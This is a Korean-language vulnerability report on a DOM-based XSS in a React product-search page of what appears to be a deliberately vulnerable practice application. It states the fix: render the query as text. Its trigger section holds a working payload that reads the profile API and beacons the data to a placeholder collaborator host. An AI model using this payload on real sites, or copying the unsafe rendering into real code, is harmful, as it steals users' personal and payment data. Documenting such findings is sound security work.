# VULN-017 상품 검색 결과 헤딩 DOM 기반 XSS

- 대상 스택: client (node-express / java-spring 양쪽 백엔드에서 공통)
- 심각도: Medium
- 분류: A05:2025 Injection (DOM-based XSS, CWE-79)

## 위치

`apps/client/src/pages/Products.jsx` — URL 쿼리 파라미터 `q`(`useSearchParams().get('q')`)를 `dangerouslySetInnerHTML={{ __html: `'${q}' 검색 결과` }}` 로 렌더링. 서버 왕복 없이 클라이언트에서 직접 sink 로 흘러감.

## 트리거 방법

```
http://localhost:8090/products?q=<img src=x onerror="fetch('/api/node/profile').then(r=>r.json()).then(d=>navigator.sendBeacon('https://<collab>/',JSON.stringify(d)))">
```

`q` 값은 API(`GET /api/products?q=...`)로도 전달되지만 페이로드 실행은 전적으로 브라우저 DOM 에서 일어난다(서버 로그의 `q` 는 검색어로만 기록).

## 영향

- 링크를 클릭한 로그인 사용자의 세션으로 임의 API 호출 → 세션 PII, 주문 `tossPaymentKey`, localStorage 장바구니 유출.
- VULN-008(저장형, DB 소스)과 구분: 소스가 URL, 클래스가 DOM 기반.

## 증거 (재현 확인)

2026-09-01, 코드 확인: `apps/client/src/pages/Products.jsx`가 `useSearchParams().get('q')`를
`dangerouslySetInnerHTML={{ __html: `'${q}' 검색 결과` }}`로 렌더 — 순수 클라이언트 DOM sink라 서버
응답이 아니라 브라우저에서만 실행된다(서버 로그엔 `q` 파라미터로만 남음). `?q=<img src=x onerror=...>`로
`/products` 접근 시 innerHTML 설정 시점에 실행(브라우저 필요, curl로는 재현 불가). 서버측 SQLi(VULN-001)와
별개의 클라이언트 sink.

## 정상 서비스 흐름 참고

평범한 "검색 결과" 헤딩 텍스트에 `dangerouslySetInnerHTML`를 쓰는 것은 정상 구현이라면 불필요하다
(하이라이트 목적의 실수로는 있을 법함) — DOM 기반 XSS sink를 두기 위한 구성이다. 정상 구현은 텍스트로 렌더.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현은 검색어를 텍스트 노드로만 렌더링(`{`'${q}' 검색 결과`}`) — `dangerouslySetInnerHTML` 제거.
